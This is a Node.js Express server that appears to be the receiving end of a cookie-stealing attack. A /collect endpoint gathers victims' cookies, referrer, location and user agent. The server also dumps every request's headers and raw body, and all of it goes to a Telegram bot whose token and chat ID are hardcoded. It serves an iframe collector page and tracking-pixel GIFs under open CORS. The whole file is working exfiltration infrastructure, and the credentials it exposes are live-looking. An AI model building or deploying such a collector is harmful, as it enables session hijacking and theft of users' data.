const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const axios = require('axios');

const app = express();
app.use(bodyParser.json({ type: '*/*' })); // Capture any JSON body
app.use(bodyParser.text({ type: '*/*', limit: '5mb' })); // Also capture raw text bodies
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', '*');
  next();
});
// Telegram config
const TELEGRAM_BOT_TOKEN = '8748740739:AAE--7CFFMibv2GlcPEcebw8_uDD-D9C5xM';
const TELEGRAM_CHAT_ID = '1903358250';

// Helper: send message to Telegram (handles >4096 chars by splitting)
async function telegramMessage(text) {
  const MAX_LEN = 4096;
  const chunks = [];
  for (let i = 0; i < text.length; i += MAX_LEN) {
    chunks.push(text.slice(i, i + MAX_LEN));
  }
  for (const chunk of chunks) {
    try {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: chunk,
        parse_mode: 'Markdown'
      });
    } catch (e) {
      console.error('[Telegram] Failed to send chunk:', e.response?.data || e.message);
    }
  }
}

// Capture raw body early (before any other middleware that might consume it)
app.use((req, res, next) => {
  const chunks = [];
  req.on('data', d => chunks.push(d));
  req.on('end', () => {
    req.rawBody = Buffer.concat(chunks);
    next();
  });
});

// Log everything + notify Telegram
app.use((req, res, next) => {
  const timestamp = new Date().toISOString();
  const ip = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown';

  // Build a full request dump
  let report = `*Full Request Dump*\n`;
  report += `*Timestamp:* ${timestamp}\n`;
  report += `*IP:* ${ip}\n`;
  report += `*Request Line:* \`${req.method} ${req.url} HTTP/${req.httpVersion}\`\n\n`;
  report += `*Headers:*\n`;
  for (const [k, v] of Object.entries(req.headers)) {
    report += `${k}: ${v}\n`;
  }
  // Include raw body if present (base64 to avoid binary issues)
  if (req.rawBody && req.rawBody.length > 0) {
    const preview = req.rawBody.length <= 1024 ? req.rawBody.toString('utf8') : req.rawBody.slice(0, 1024).toString('utf8') + '... (truncated)';
    report += `\n*Raw Body (preview):*\n\`\`\`\n${preview}\n\`\`\`\n`;
    report += `*Raw Body (base64):*\n\`\`\`\n${req.rawBody.toString('base64')}\n\`\`\`\n`;
  } else {
    report += `\n*Body:* (none)\n`;
  }

  console.log(`[${timestamp}] ${req.method} ${req.url}`);
  console.log('Headers:', req.headers);
  if (req.rawBody && req.rawBody.length > 0) console.log('Raw body length:', req.rawBody.length);

  // Send to Telegram
  telegramMessage(report).catch(() => {});

  next();
});

// Collect endpoint (still parses JSON if possible)
app.post('/collect', (req, res) => {
  const timestamp = new Date().toISOString();
  let parsed = {};
  try {
    parsed = JSON.parse(req.rawBody);
  } catch {}
  const { ts, method, cookies, userAgent, referrer, location } = parsed;

  console.log('=== COLLECTED ===');
  console.log('Parsed payload:', parsed);
  console.log('==================');

  // Telegram detailed collect payload
  let collectReport = `*Collect Endpoint Payload*\n`;
  collectReport += `*Timestamp:* ${timestamp}\n`;
  collectReport += `*Parsed JSON:* ${JSON.stringify(parsed, null, 2)}\n`;
  collectReport += `*Cookies:* ${cookies}\n`;
  collectReport += `*Referrer:* ${referrer}\n`;
  collectReport += `*Location:* ${location}\n`;
  collectReport += `*User-Agent:* ${userAgent}\n`;

  telegramMessage(collectReport).catch(() => {});

  res.sendStatus(200);
});

// Serve collector.html for iframe
app.get('/collector.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'collector.html'));
});

// Serve a 1x1 transparent GIF for image triggers
app.get('/trigger.gif', (req, res) => {
  const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
  res.setHeader('Content-Type', 'image/gif');
  res.send(gif);
  console.log('[trigger.gif] Served transparent pixel');
});

// Serve a visible button GIF (you can replace with your own 120x30 GIF)
app.get('/button.gif', (req, res) => {
  const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
  res.setHeader('Content-Type', 'image/gif');
  res.send(gif);
  console.log('[button.gif] Served button pixel');
});

// Debug page (optional)
app.get('/debug', (req, res) => {
  res.send(`
    <h2>Debug Console</h2>
    <pre id="log"></pre>
    <script>
      const logEl = document.getElementById('log');
      const evtSource = new EventSource('/debug-stream');
      evtSource.onmessage = e => logEl.textContent += e.data + '\\n';
    </script>
  `);
});

// Simple SSE stream for live debug view (optional)
app.get('/debug-stream', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.flushHeaders();
  const interval = setInterval(() => {
    res.write(`data: [${new Date().toISOString()}] Heartbeat\\n\\n`);
  }, 30000);
  req.on('close', () => clearInterval(interval));
});

const PORT = process.env.PORT || 80;
app.listen(PORT, () => console.log(`Server listening on port ${PORT}`));